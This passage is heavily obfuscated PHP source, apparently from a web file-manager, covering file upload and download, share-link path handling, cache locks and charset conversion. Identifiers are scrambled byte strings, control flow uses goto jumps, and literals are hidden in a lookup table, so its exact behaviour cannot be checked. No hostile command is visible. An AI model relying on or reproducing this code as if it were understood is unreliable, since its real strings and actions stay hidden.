$D…ÌÉ©ù—); return $this->getPathOuter($aÚçåÚßó—); } public function uploadFileByID($A¦ó‰¥Ìø£, $BÚ†Ğó¨‹¡, $EŞ÷ôŸù½ñ) { $bé…«÷Ğ‡ =& $_SERVER[æ§›¦ÌáØ]; $eãÊ¸ÄÖŒ = $this->parse($A¦ó‰¥Ìø£); $BÍÕèê”‰ = $this->model->addFileByFileID($eãÊ¸ÄÖŒ[$bé…«÷Ğ‡[393]], $BÚ†Ğó¨‹¡, $eãÊ¸ÄÖŒ[$bé…«÷Ğ‡[76]], $EŞ÷ôŸù½ñ); return $this->getPathOuter($BÍÕèê”‰); } public function addFileByRemote($fâÍ¹¨•´Ò, $DŸ™àª‹‰Ş, $CšƒéÂ‡— = array(), $FºŸïó»ÚÀ = '', $cÉÃ‚âÜ×) { $f¡¯‚ÀÇ’ =& $_SERVER[æ§›¦ÌáØ]; $bö‘¤‰ó² = $this->parse($fâÍ¹¨•´Ò); $FºŸïó»ÚÀ = empty($FºŸïó»ÚÀ) ? $bö‘¤‰ó²[$f¡¯‚ÀÇ’[76]] : $FºŸïó»ÚÀ; $a…£©¶è¤‘ = $this->model->addFileByRemote($bö‘¤‰ó²[$f¡¯‚ÀÇ’[393]], $DŸ™àª‹‰Ş, $FºŸïó»ÚÀ, $CšƒéÂ‡—, $cÉÃ‚âÜ×); return $this->getPathOuter($a…£©¶è¤‘); } public function uploadLink($Dæ‘Ÿ¿òìÇ, $E¾¾¥Àë‡ = 0) { $bÉÂ¨„´ÀÀ =& $_SERVER[æ§›¦ÌáØ]; $BĞõŒ©òğ = $this->parse($Dæ‘Ÿ¿òìÇ); $aˆè—ä—Éø = _get($GLOBALS[$bÉÂ¨„´ÀÀ[7]], $bÉÂ¨„´ÀÀ[1198]); $E’¨ÃÇß¦ = _get($GLOBALS[$bÉÂ¨„´ÀÀ[7]], $bÉÂ¨„´ÀÀ[1199]); $Dæ‘Ÿ¿òìÇ = Model($bÉÂ¨„´ÀÀ[584])->createFileName($BĞõŒ©òğ[$bÉÂ¨„´ÀÀ[76]], $aˆè—ä—Éø, $E’¨ÃÇß¦); return IO::uploadLink($Dæ‘Ÿ¿òìÇ, $E¾¾¥Àë‡); } public function fileNameAuto($B¨£¾Ê¾éª, $e¡Áíâ¤†µ, $aœ‚£ñ¶ä“ = REPEAT_REPLACE, $Eç£—³˜Ø = false) { return $this->model->fileNameAuto($B¨£¾Ê¾éª, $e¡Áíâ¤†µ, $aœ‚£ñ¶ä“, $Eç£—³˜Ø); } public function fileNameExist($D¶éñˆ‚ä…, $e‚‘ÛŞá©Ã) { return $this->model->fileNameExist($D¶éñˆ‚ä…, $e‚‘ÛŞá©Ã); } protected function _fileOut($BçåÓÊë‹é, $FğÄïÒé× = false, $B¬¬ÒÙŒÄƒ = false, $báƒ®ñö¡• = '', $AéêÆˆÙÉˆ = false) { goto d£—Ğ³Õ°; d£—Ğ³Õ°: $Aø¨¡ã¶›´ =& $_SERVER[æ§›¦ÌáØ]; $fƒš‡›¢œİ = $this->model->sourceInfo($BçåÓÊë‹é); if ($fƒš‡›¢œİ[$Aø¨¡ã¶›´[403]] == $Aø¨¡ã¶›´[87]) { header($Aø¨¡ã¶›´[1200]); die; } goto D‘‹ä·¯´®; AƒŞò‹¸óŠ: if ($AéêÆˆÙÉˆ) { return IO::fileOutServer($eÂÄ¹Ø³×[$Aø¨¡ã¶›´[76]], $FğÄïÒé×, $D¬ÜŒËÒâ¼, $báƒ®ñö¡•); } IO::fileOut($eÂÄ¹Ø³×[$Aø¨¡ã¶›´[76]], $FğÄïÒé×, $D¬ÜŒËÒâ¼, $báƒ®ñö¡•); goto aˆ½Ñ‡Ã¿˜; D‘‹ä·¯´®: $eÂÄ¹Ø³× = $this->model->fileInfoGet($BçåÓÊë‹é); $báƒ®ñö¡• = $eÂÄ¹Ø³×[$Aø¨¡ã¶›´[170]] ? $eÂÄ¹Ø³×[$Aø¨¡ã¶›´[170]] : $báƒ®ñö¡•; $D¬ÜŒËÒâ¼ = isset($GLOBALS[$Aø¨¡ã¶›´[1201]]) ? $GLOBALS[$Aø¨¡ã¶›´[1201]] : $fƒš‡›¢œİ[$Aø¨¡ã¶›´[28]]; goto AƒŞò‹¸óŠ; aˆ½Ñ‡Ã¿˜: } public function fileOut($fì‡„»ÁŞš, $a—…®÷ç¦… = false, $eï’áÛŠÓ½ = false, $aÏºêµÚØ = '') { $this->_fileOut($fì‡„»ÁŞš, $a—…®÷ç¦…, $eï’áÛŠÓ½, $aÏºêµÚØ); } public function fileOutServer($eì˜‘Ÿ’Ê‹, $ešİİ‰¦ïÂ = false, $e‹ã£å°Æõ = false, $DáÁÒ°ßÓ = '') { $this->_fileOut($eì˜‘Ÿ’Ê‹, $ešİİ‰¦ïÂ, $e‹ã£å°Æõ, $DáÁÒ°ßÓ, !0); } protected function _fileOutImage($aƒøùƒŠ¡Û, $fœØğ§ÙõŠ = 250) { goto aéÙÑÛ†§ß; aéÙÑÛ†§ß: $Eªæ‚èÚÚ =& $_SERVER[æ§›¦ÌáØ]; $f…Ğ‘½ïî¨ = $this->model->pathInfo($aƒøùƒŠ¡Û); if ($f…Ğ‘½ïî¨[$Eªæ‚èÚÚ[403]] == $Eªæ‚èÚÚ[87]) { show_json($Eªæ‚èÚÚ[1202] . $aƒøùƒŠ¡Û, !1); } goto Eğ–®†„Ã”; D×¨á‹ŒµÏ: $GLOBALS[$Eªæ‚èÚÚ[1201]] = $Báã ±»ôƒ[$Eªæ‚èÚÚ[28]]; $GLOBALS[$Eªæ‚èÚÚ[162]] = $Báã ±»ôƒ; IO::fileOutImage($Báã ±»ôƒ[$Eªæ‚èÚÚ[76]], $fœØğ§ÙõŠ); goto câ¬æí™”; Eğ–®†„Ã”: $Báã ±»ôƒ = $this->model->fileInfoGet($aƒøùƒŠ¡Û); $Báã ±»ôƒ[$Eªæ‚èÚÚ[28]] = $f…Ğ‘½ïî¨[$Eªæ‚èÚÚ[28]]; $Báã ±»ôƒ[$Eªæ‚èÚÚ[163]] = $f…Ğ‘½ïî¨[$Eªæ‚èÚÚ[163]]; goto D×¨á‹ŒµÏ; câ¬æí™”: } public function fileOutImage($cí–ˆÊÒß†, $Câõ“•ÌÙ® = 250) { $this->_fileOutImage($cí–ˆÊÒß†, $Câõ“•ÌÙ®); } public function fileOutImageServer($Fˆ…×¨²©œ, $fãËÈµ©â = 250) { $this->_fileOutImage($Fˆ…×¨²©œ, $fãËÈµ©â); } public function link($Bôğ¿…¶¯, $BáÍ»º›¦œ = '') { $fŒõ†§ˆŒØ = $this->model->fileInfoGet($Bôğ¿…¶¯); return IO::link($fŒõ†§ˆŒØ[$_SERVER[æ§›¦ÌáØ][76]], $BáÍ»º›¦œ); } protected function parse($DäëŠ³íØ…) { $CËÇìğÓ÷ö =& $_SERVER[æ§›¦ÌáØ]; if (strstr($DäëŠ³íØ…, $CËÇìğÓ÷ö[8]) === !1) { return array($CËÇìğÓ÷ö[412] => intval($DäëŠ³íØ…), $CËÇìğÓ÷ö[76] => $CËÇìğÓ÷ö[33], $CËÇìğÓ÷ö[1197] => array()); } $FÊ öğ·Æò = explode($CËÇìğÓ÷ö[8], trim($DäëŠ³íØ…, $CËÇìğÓ÷ö[8])); if (count($FÊ öğ·Æò) < 2) { show_tips($DäëŠ³íØ… . $CËÇìğÓ÷ö[1203]); } return array($CËÇìğÓ÷ö[412] => intval($FÊ öğ·Æò[0]), $CËÇìğÓ÷ö[76] => $FÊ öğ·Æò[1], $CËÇìğÓ÷ö[1197] => array_slice($FÊ öğ·Æò, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($bäÄã‚ÖÉ¤) { $this->pathParse = $bäÄã‚ÖÉ¤; $this->model = Model($_SERVER[æ§›¦ÌáØ][1196]); } public function getPathOuter($fÓÌø£Œ¹±) { $F³Ğ¶ÜÖöÀ =& $_SERVER[æ§›¦ÌáØ]; if (!$fÓÌø£Œ¹±) { return $fÓÌø£Œ¹±; } $FÊáõ·Æ¹ª = $this->parse($fÓÌø£Œ¹±); return trim(KodIO::makeShare($this->pathParse[$F³Ğ¶ÜÖöÀ[393]], $FÊáõ·Æ¹ª[$F³Ğ¶ÜÖöÀ[393]]), $F³Ğ¶ÜÖöÀ[8]); } protected function infoParse($fÒê¶‚ÉÈŠ, $bí‡¶© ¼… = false, $fƒÆÉ¬Ï¶´ = false) { $Dßá¹§òˆ‘ =& $_SERVER[æ§›¦ÌáØ]; $a‡ãÂŞøïî = $this->pathParse[$Dßá¹§òˆ‘[393]]; $c·‹¸¬öŞ® = trim($this->pathParse[$Dßá¹§òˆ‘[1054]], $Dßá¹§òˆ‘[8]); return Action($Dßá¹§òˆ‘[1204])->sharePathInfo($a‡ãÂŞøïî, $c·‹¸¬öŞ®); } public function infoFull($Aèù›‚ˆ±°) { $B÷ÖŞ—Ÿ¤ =& $_SERVER[æ§›¦ÌáØ]; $FÏ±½õŒŸ¢ = explode($B÷ÖŞ—Ÿ¤[8], trim($Aèù›‚ˆ±°, $B÷ÖŞ—Ÿ¤[8])); if (count($FÏ±½õŒŸ¢) > 1) { $Cµßò©ËÁ½ = implode($B÷ÖŞ—Ÿ¤[8], array_splice($FÏ±½õŒŸ¢, 1)); $aÇ‚…”öË· = $this->model->pathInfoByPath($FÏ±½õŒŸ¢[0], $Cµßò©ËÁ½); if (!$aÇ‚…”öË·) { return !1; } $this->pathParse[$B÷ÖŞ—Ÿ¤[1054]] = $aÇ‚…”öË·[$B÷ÖŞ—Ÿ¤[395]]; } return $this->infoParse($Aèù›‚ˆ±°); } public function listAll($DÉ¦è«íÆ“) { goto aÎÔÙÑÚÛ«; aÎÔÙÑÚÛ«: $dÈ¡¸âœÍ =& $_SERVER[æ§›¦ÌáØ]; $a†²‘òœ¸Ş = IO::info($this->pathParse[$dÈ¡¸âœÍ[76]]); if (!$a†²‘òœ¸Ş) { return array(); } goto eĞ½›ÊŸÊ; eĞ½›ÊŸÊ: $EŠ÷·‹§” = $this->model->listAll($DÉ¦è«íÆ“); $Dßá¦¯òƒÚ = Model($dÈ¡¸âœÍ[576])->getInfo($a†²‘òœ¸Ş[$dÈ¡¸âœÍ[468]]); $a ğ¤İÀæš = Action($dÈ¡¸âœÍ[1204]); goto bË²™½’Óğ; bË²™½’Óğ: foreach ($EŠ÷·‹§” as &$CšÀ”Óº¬ì) { check_abort(); $CšÀ”Óº¬ì[$dÈ¡¸âœÍ[85]] = $a ğ¤İÀæš->_shareItemeParse($CšÀ”Óº¬ì[$dÈ¡¸âœÍ[85]], $Dßá¦¯òƒÚ); } unset($CšÀ”Óº¬ì); return $EŠ÷·‹§”; goto CÕ¯½ãæ’Û; CÕ¯½ãæ’Û: } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($D¿ŠùÃÑˆ) { $this->pathParse = $D¿ŠùÃÑˆ; $this->model = Model($_SERVER[æ§›¦ÌáØ][1196]); } protected function infoParse($FóÜ¼òğ„“, $D¹Ãô’›êñ = false, $CÅ­œÒÓµ‘ = false) { $BÃìËª•Æœ =& $_SERVER[æ§›¦ÌáØ]; return Action($BÃìËª•Æœ[1060])->sharePathInfo($this->pathParse[$BÃìËª•Æœ[76]], !0); } public function listPath($c”â´–Æµó, $c¥‘ƒÎßã = false) { $cÌ¤¤«ŒÕ… =& $_SERVER[æ§›¦ÌáØ]; $bí˜Ø’ªàÄ = parent::listPath($c”â´–Æµó, $c¥‘ƒÎßã); foreach ($bí˜Ø’ªàÄ as $D¶İ‚ÄÉÄí => $DÚÔ¥Š‰­ª) { if (!in_array($D¶İ‚ÄÉÄí, array($cÌ¤¤«ŒÕ…[74], $cÌ¤¤«ŒÕ…[75]))) { continue; } foreach ($DÚÔ¥Š‰­ª as $d±ÍÆÍññï => $F„†Ï‚”ì†) { $bí˜Ø’ªàÄ[$D¶İ‚ÄÉÄí][$d±ÍÆÍññï] = Action($cÌ¤¤«ŒÕ…[1060])->shareItemInfo($F„†Ï‚”ì†); } } return $bí˜Ø’ªàÄ; } public function listAll($e³ä‘âÙÇ¬) { goto cí…ä••Ïñ; a×Ñ’‘•Ùß: return $f‹ä¼ñĞì²; goto EÄ›¸ñàˆÛ; cí…ä••Ïñ: $eœÁö½î¬ =& $_SERVER[æ§›¦ÌáØ]; $c¨İÒ§ïÓ¯ = IO::info($this->pathParse[$eœÁö½î¬[76]]); if (!$c¨İÒ§ïÓ¯) { return array(); } goto BœÖ‘±ØÒ; BœÖ‘±ØÒ: $f‹ä¼ñĞì² = $this->model->listAll($e³ä‘âÙÇ¬); foreach ($f‹ä¼ñĞì² as &$d¹„”¸àŒÛ) { $d¹„”¸àŒÛ[$eœÁö½î¬[85]] = Action($eœÁö½î¬[1060])->shareItemInfo($d¹„”¸àŒÛ[$eœÁö½î¬[85]]); } unset($d¹„”¸àŒÛ); goto a×Ñ’‘•Ùß; EÄ›¸ñàˆÛ: } } goto b¯“‘ÄµÑ; dæÌ ğõÓ: class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { goto døğªŸØ; døğªŸØ: $a†²•ÉÚ =& $_SERVER[æ§›¦ÌáØ]; if (self::$handle) { return self::$handle; } $B›„‡®¯Ü = $GLOBALS[$a†²•ÉÚ[6]][$a†²•ÉÚ[347]]; goto c‹õšîˆ¯¾; f‘äŒ²…ñ: if ($a£Äõ¥±êË == $a†²•ÉÚ[17] && $f£”×ŠÑ¼ == $a†²•ÉÚ[9]) { $a£Äõ¥±êË = $a†²•ÉÚ[193]; } switch ($a£Äõ¥±êË) { case $a†²•ÉÚ[796]: self::$handle = new CacheLockRedis(); break; case $a†²•ÉÚ[797]: self::$handle = new CacheLockMemcached(); break; case $a†²•ÉÚ[17]: self::$handle = new CacheLockDatabase(); break; case $a†²•ÉÚ[193]: self::$handle = new CacheLockFile(); break; default: break; } return self::$handle; goto CÈ’‹’á; c‹õšîˆ¯¾: self::$timeout = $B›„‡®¯Ü[$a†²•ÉÚ[806]] ? $B›„‡®¯Ü[$a†²•ÉÚ[806]] : 10; $f£”×ŠÑ¼ = _get($GLOBALS[$a†²•ÉÚ[6]], $a†²•ÉÚ[807]); $a£Äõ¥±êË = $B›„‡®¯Ü[$a†²•ÉÚ[793]] ? $B›„‡®¯Ü[$a†²•ÉÚ[793]] : $a†²•ÉÚ[193]; goto f‘äŒ²…ñ; CÈ’‹’á: } private static function key($B¼¹óß´³¼) { return $_SERVER[æ§›¦ÌáØ][808] . Cache::key($B¼¹óß´³¼); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($B¤®¢Ç‡² = '') { self::$errorMsg = $B¤®¢Ç‡²; } public static function lockGlobal($f›ĞİÜ°˜, $C†íöï¯‹¼) { return self::lock($f›ĞİÜ°˜, $C†íöï¯‹¼, !0); } public static function lock($a¤«Òì»á, $A§¨°Í®ÛÄ = false, $BŞ‹ŞçÈĞ‡ = false) { goto b½èˆº´ëí; bá©ÍØ: $A§¨°Í®ÛÄ = $A§¨°Í®ÛÄ ? $A§¨°Í®ÛÄ : self::$timeout; $aØöÎÖ«— = $B£ê¾Â¤™ö->lock($C¹×§ÙéÃ, $A§¨°Í®ÛÄ); if (!$aØöÎÖ«—) { $EÍÓâ¹£•Ë = "\x6c\157\143\153\x20\x65\162\162\x6f\162\x3b\153\x65\171\x3d{$a¤«Òì»á}\73\164\151\x6d\145\x3d{$A§¨°Í®ÛÄ}\73" . self::$errorMsg . $Fğöµ±ĞÎÌ[68] . get_caller_msg(); $f ó›çŠí = LNG($Fğöµ±ĞÎÌ[809]) . "\50{$A§¨°Í®ÛÄ}\x73\x29\x2e" . LNG($Fğöµ±ĞÎÌ[810]); $f ó›çŠí .= $Fğöµ±ĞÎÌ[811]; if (is_string(self::$errorMsg) && self::$errorMsg) { $f ó›çŠí = $f ó›çŠí . $Fğöµ±ĞÎÌ[812] . self::$errorMsg; } write_log($EÍÓâ¹£•Ë, $Fğöµ±ĞÎÌ[813]); show_json($f ó›çŠí, !1); } goto EŒÖÎŸØŸ; b½èˆº´ëí: $Fğöµ±ĞÎÌ =& $_SERVER[æ§›¦ÌáØ]; $B£ê¾Â¤™ö = self::init(); $C¹×§ÙéÃ = self::key($a¤«Òì»á); goto bá©ÍØ; EŒÖÎŸØŸ: if (!$BŞ‹ŞçÈĞ‡) { self::$lockItem[$C¹×§ÙéÃ] = !0; } return $aØöÎÖ«—; goto c•¸ó³‰Úº; c•¸ó³‰Úº: } public static function lockGet($Bî˜õÅ²—ê) { $F‡ÉçĞô·Ü = self::key($Bî˜õÅ²—ê); if (self::$lockItem[$F‡ÉçĞô·Ü]) { return self::$lockItem[$F‡ÉçĞô·Ü]; } return self::init()->lockGet($F‡ÉçĞô·Ü); } public static function unlock($A†Æ÷ŠÙäæ) { $aÖÉéÈØ§ = self::key($A†Æ÷ŠÙäæ); self::$lockItem[$aÖÉéÈØ§] = null; return self::init()->unlock($aÖÉéÈØ§); } public static function unlockRuntime() { $A¢ÌøÄšÔ– =& $_SERVER[æ§›¦ÌáØ]; $bâ„ë…ƒá = self::init(); $dÅ—‘ÅŒÃ = !1; foreach (self::$lockItem as $BªĞİÇ³ => $e¦±â¸Õ) { if (!$e¦±â¸Õ) { continue; } $bâ„ë…ƒá->unlock($BªĞİÇ³); if (!$dÅ—‘ÅŒÃ) { $dÅ—‘ÅŒÃ = !0; write_log($A¢ÌøÄšÔ–[814] . $BªĞİÇ³ . $A¢ÌøÄšÔ–[68] . get_caller_msg(), $A¢ÌøÄšÔ–[813]); continue; } write_log($A¢ÌøÄšÔ–[814] . $BªĞİÇ³, $A¢ÌøÄšÔ–[813]); } self::fileUnlockAll(); } public static function fileLock($CÁŠÙ¾ì©) { goto A¥•Ûêë; BÒÕ›–çç: return !1; goto E‚À¤äÖ¼ ; F¾òÈïÖœ: if (flock($d›À‡”Ú§è, LOCK_EX)) { return !0; } self::unlock($CÁŠÙ¾ì©); show_json($dâµ§„²ğ[818], !1); goto BÒÕ›–çç; A¥•Ûêë: $dâµ§„²ğ =& $_SERVER[æ§›¦ÌáØ]; if (!$GLOBALS[$dâµ§„²ğ[815]]) { $GLOBALS[$dâµ§„²ğ[815]] = array(); } $GLOBALS[$dâµ§„²ğ[815]][$CÁŠÙ¾ì©] = !1; goto aÓÈ©ôÃ¦ø; aÓÈ©ôÃ¦ø: $d›À‡”Ú§è = fopen(DATA_PATH . $CÁŠÙ¾ì© . $dâµ§„²ğ[816], $dâµ§„²ğ[817]); if (!$d›À‡”Ú§è) { return !1; } $GLOBALS[$dâµ§„²ğ[815]][$CÁŠÙ¾ì©] = $d›À‡”Ú§è; goto F¾òÈïÖœ; E‚À¤äÖ¼ : } public static function fileUnlock($C‚¹¥Ÿï) { $f„¡åï¥• =& $_SERVER[æ§›¦ÌáØ]; $Aªš¿›òø¯ = $GLOBALS[$f„¡åï¥•[815]][$C‚¹¥Ÿï]; if (!$Aªš¿›òø¯) { return; } $GLOBALS[$f„¡åï¥•[815]][$C‚¹¥Ÿï] = !1; flock($Aªš¿›òø¯, LOCK_UN); fclose($Aªš¿›òø¯); } public static function fileUnlockAll() { $Bï”Ò›Ï¼à =& $_SERVER[æ§›¦ÌáØ]; if (!$GLOBALS[$Bï”Ò›Ï¼à[815]]) { return; } foreach ($GLOBALS[$Bï”Ò›Ï¼à[815]] as $f³¥ªÒ‘ãã => $BØ¨® ­éœ) { if (!$BØ¨® ­éœ) { continue; } $GLOBALS[$Bï”Ò›Ï¼à[815]][$f³¥ªÒ‘ãã] = !1; flock($BØ¨® ­éœ, LOCK_UN); fclose($BØ¨® ­éœ); } $GLOBALS[$Bï”Ò›Ï¼à[815]] = array(); } } function cacheLockWait() { usleep(mt_rand(200, 5000)); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $añ½‡±³ÊÎ =& $_SERVER[æ§›¦ÌáØ]; $bš†Öäö = $GLOBALS[$añ½‡±³ÊÎ[6]][$añ½‡±³ÊÎ[347]]; self::$cachePath = $bš†Öäö[$añ½‡±³ÊÎ[193]][$añ½‡±³ÊÎ[76]]; @mkdir(self::$cachePath, 511, !0); } public function lock($Có—ó†‰¬Ü, $f•·ÑŠ–£† = 0) { goto a’†é†ŒÉÎ; a’†é†ŒÉÎ: $dÒ“É±²ŞÜ =& $_SERVER[æ§›¦ÌáØ]; $BÜ ‰ŒŸôÀ = microtime(!0); $bĞ¡¸ïêÜ“ = $BÜ ‰ŒŸôÀ + $f•·ÑŠ–£† + 0.0001; goto a”òÇçô†„; a”òÇçô†„: $c¹®ã–íÒ• = rtrim(self::$cachePath, $dÒ“É±²ŞÜ[8]) . $dÒ“É±²ŞÜ[819] . md5($Có—ó†‰¬Ü) . $dÒ“É±²ŞÜ[816]; if (file_exists($c¹®ã–íÒ•) && filemtime($c¹®ã–íÒ•) && filemtime($c¹®ã–íÒ•) < time() - 10) { @unlink($c¹®ã–íÒ•); } do { if (file_exists($c¹®ã–íÒ•)) { cacheLockWait(); continue; } $fØ§ì‰À±ò = fopen($c¹®ã–íÒ•, $dÒ“É±²ŞÜ[820]); if (!$fØ§ì‰À±ò) { return !1; } $dâ¬ÆƒİŸ = flock($fØ§ì‰À±ò, LOCK_EX | LOCK_NB); self::$caches[$Có—ó†‰¬Ü] = array($dÒ“É±²ŞÜ[821] => $fØ§ì‰À±ò, $dÒ“É±²ŞÜ[193] => $c¹®ã–íÒ•); fwrite($fØ§ì‰À±ò, $bĞ¡¸ïêÜ“); clearstatcache(); if ($fØ§ì‰À±ò && $dâ¬ÆƒİŸ) { return !0; } cacheLockWait(); } while (microtime(!0) < $bĞ¡¸ïêÜ“); goto E‚Â¶Îİöä; E‚Â¶Îİöä: $this->unlock($Có—ó†‰¬Ü); return !1; goto Eî±ÑÊÕ; Eî±ÑÊÕ: } public function lockGet($aùå¬§‹Û®) { $cñˆğè¸Â­ =& $_SERVER[æ§›¦ÌáØ]; $d©¯ÏõÁç = rtrim(self::$cachePath, $cñˆğè¸Â­[8]) . $cñˆğè¸Â­[819] . md5($aùå¬§‹Û®) . $cñˆğè¸Â­[816]; return file_exists($d©¯ÏõÁç); } public function unlock($cƒß¹¬Í†¹) { goto BŠ…ßëîÂ²; FÄ«®óÈÒä: @flock($d„¥”ôÓ—[$d¬Û¶öªæ[821]], LOCK_UN); @fclose($d„¥”ôÓ—[$d¬Û¶öªæ[821]]); @unlink($d„¥”ôÓ—[$d¬Û¶öªæ[193]]); goto e‹ŸŞÃÂÃµ; e‹ŸŞÃÂÃµ: unset(self::$caches[$cƒß¹¬Í†¹]); goto Aİ¦¸®ò; BŠ…ßëîÂ²: $d¬Û¶öªæ =& $_SERVER[æ§›¦ÌáØ]; $d„¥”ôÓ— = self::$caches[$cƒß¹¬Í†¹]; if (!$d„¥”ôÓ—) { return; } goto FÄ«®óÈÒä; Aİ¦¸®ò: } } goto döôï«Ä»; DíÔ—ã¦½«: define($_SERVER[æ§›¦ÌáØ][237], 2); define($_SERVER[æ§›¦ÌáØ][238], 3); define($_SERVER[æ§›¦ÌáØ][239], 1); goto CÜÚ¨ˆğ’›; BñÊ—©Á…: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public function __construct() { $EàœÓ´š¯Ì =& $_SERVER[æ§›¦ÌáØ]; $this->objectDriver = array($EàœÓ´š¯Ì[57], $EàœÓ´š¯Ì[58], $EàœÓ´š¯Ì[59], $EàœÓ´š¯Ì[60], $EàœÓ´š¯Ì[61], $EàœÓ´š¯Ì[62], $EàœÓ´š¯Ì[63], $EàœÓ´š¯Ì[64], $EàœÓ´š¯Ì[65]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($bĞï—²ØÕÎ) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($bĞï—²ØÕÎ, $_SERVER[æ§›¦ÌáØ][8]); } return $bĞï—²ØÕÎ; } public function iconvApp($aë ¿Š¨¹Ã) { return $aë ¿Š¨¹Ã; } public function iconvSystem($b…ëÜÙÙÇŸ) { return $b…ëÜÙÙÇŸ; } public function iconvTo($Fã‚ÉÔ×ïé, $EÍËÀŞ°–, $BÁ ¯£ŒñÂ) { goto B¯Î’©ñÚ•; B¯Î’©ñÚ•: $aà¹çœ¼´¥ =& $_SERVER[æ§›¦ÌáØ]; if (!$Fã‚ÉÔ×ïé || !function_exists($aà¹çœ¼´¥[66])) { return $Fã‚ÉÔ×ïé; } static $C¢·½æÃá« = array(); goto d–…Š…ãåğ; C®ŒŒŒœÍÚ: $C¢·½æÃá«[$BÁ ¯£ŒñÂ . $aà¹çœ¼´¥[67] . $EÍËÀŞ°– . $aà¹çœ¼´¥[68] . $Fã‚ÉÔ×ïé] = $Fã‚ÉÔ×ïé; $C¢·½æÃá«[$BÁ ¯£ŒñÂ . $aà¹çœ¼´¥[67] . $EÍËÀŞ°– . $aà¹çœ¼´¥[68] . $D©¾ğ–½³é] = $Fã‚ÉÔ×ïé; $C¢·½æÃá«[$EÍËÀŞ°– . $aà¹çœ¼´¥[67] . $BÁ ¯£ŒñÂ . $aà¹çœ¼´¥[68] . $D©¾ğ–½³é] = $D©¾ğ–½³é; goto e£‰¹î‚Å; D‚Æ‡ñµš«: $D©¾ğ–½³é = $D©¾ğ–½³é ? $D©¾ğ–½³é : $Fã‚ÉÔ×ïé; if (strstr($D©¾ğ–½³é, $aà¹çœ¼´¥[70])) { $D©¾ğ–½³é = str_replace($aà¹çœ¼´¥[70], $aà¹çœ¼´¥[71], $D©¾ğ–½³é); } $C¢·½æÃá«[$EÍËÀŞ°– . $aà¹çœ¼´¥[67] . $BÁ ¯£ŒñÂ . $aà¹çœ¼´¥[68] . $Fã‚ÉÔ×ïé] = $D©¾ğ–½³é; goto C®ŒŒŒœÍÚ; e£‰¹î‚Å: return $D©¾ğ–½³é; goto b¾«ÂÎËËÏ; d–…Š…ãåğ: $fßÊ›¨Ï« = $EÍËÀŞ°– . $aà¹çœ¼´¥[67] . $BÁ ¯£ŒñÂ . $aà¹çœ¼´¥[68] . $Fã‚ÉÔ×ïé; if (isset($C¢·½æÃá«[$fßÊ›¨Ï«])) { return $C¢·½æÃá«[$fßÊ›¨Ï«]; } if (function_exists($aà¹çœ¼´¥[69])) { $D©¾ğ–½³é = @mb_convert_encoding($Fã‚ÉÔ×ïé, $BÁ ¯£ŒñÂ, $EÍËÀŞ°–); } else { $D©¾ğ–½³é = @iconv($EÍËÀŞ°–, $BÁ ¯£ŒñÂ, $Fã‚ÉÔ×ïé); } goto D‚Æ‡ñµš«; b¾«ÂÎËËÏ: } public function getPathInner($fÈ™° ñå) { $Cšà…ë‡³È = IO::init($fÈ™° ñå); return $Cšà…ë‡³È->path; } public function getPathOuter($c¶ÆÍªêÅ­) { $AÏµˆ¯ç÷ =& $_SERVER[æ§›¦ÌáØ]; $d‹Ï¬ÓÂµ† = strlen(trim($this->pathBase, $AÏµˆ¯ç÷[8])); $c¶ÆÍªêÅ­ = substr(trim($c¶ÆÍªêÅ­, $AÏµˆ¯ç÷[8]), $d‹Ï¬ÓÂµ†); return $this->pathDriver . $AÏµˆ¯ç÷[8] . ltrim($c¶ÆÍªêÅ­, $AÏµˆ¯ç÷[8]); } public function isParentOf($EÄôÉ¯Õ…¯, $BìÇ¸Ä·ä³) { $fÏàƒƒÁŞÒ =& $_SERVER[æ§›¦ÌáØ]; $EÄôÉ¯Õ…¯ = rtrim(strtolower($EÄôÉ¯Õ…¯), $fÏàƒƒÁŞÒ[8]) . $fÏàƒƒÁŞÒ[8]; $BìÇ¸Ä·ä³ = rtrim(strtolower($BìÇ¸Ä·ä³), $fÏàƒƒÁŞÒ[8]) . $fÏàƒƒÁŞÒ[8]; $EîÎÎ®šº = strpos($BìÇ¸Ä·ä³, $EÄôÉ¯Õ…¯) === 0; return $EîÎÎ®šº; } public function getType() { $AÕ”Ú­‚¨ =& $_SERVER[æ§›¦ÌáØ]; $dÙµÅ½†„ = str_replace($AÕ”Ú­‚¨[72], $AÕ”Ú­‚¨[33], get_class($this)); return strtolower($dÙµÅ½†„); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($EÛ£ “ÕŠ¬, $b¬ç÷±Ò’ê) { $dİ¶Ö¶ã– =& $_SERVER[æ§›¦ÌáØ]; $E†¿¾ÂÆêŞ = rtrim($EÛ£ “ÕŠ¬, $dİ¶Ö¶ã–[8]) . $dİ¶Ö¶ã–[8] . $b¬ç÷±Ò’ê; $CÕìõİµÜ½ = $this->exist($E†¿¾ÂÆêŞ); return $CÕìõİµÜ½ ? $E†¿¾ÂÆêŞ : !1; } public function setModifyTime($f£‘ÁöÉŸ—, $cñè˜Õ¨Ù¡ = '') { } public function renameObject($AÒ°õµôµ®, $D¶ÄïÒã†) { goto Cñ‡œ×‰‰; Cñ‡œ×‰‰: $B¨¡èØ³Í =& $_SERVER[æ§›¦ÌáØ]; $CÂÆÓ—Ôø¨ = $D¶ÄïÒã†; Hook::trigger($B¨¡èØ³Í[73], $this, $AÒ°õµôµ®, $this, $this->pathFather($AÒ°õµôµ®) . $D¶ÄïÒã†); goto bÚ•‡ÛËèÙ; bÚ•‡ÛËèÙ: $AÒ°õµôµ® = $this->getPathOuter($AÒ°õµôµ®); $D¶ÄïÒã† = $this->pathFather($AÒ°õµôµ®) . $D¶ÄïÒã†; if (IO::isFile($AÒ°õµôµ®)) { $d–Şù²Ší = IO::copy($AÒ°õµôµ®, $this->pathFather($AÒ°õµôµ®), REPEAT_RENAME_FOLDER, $CÂÆÓ—Ôø¨); if ($d–Şù²Ší) { IO::remove($AÒ°õµôµ®); } } else { $d–Şù²Ší = IO::mkdir($D¶ÄïÒã†); if (!$d–Şù²Ší) { return !1; } 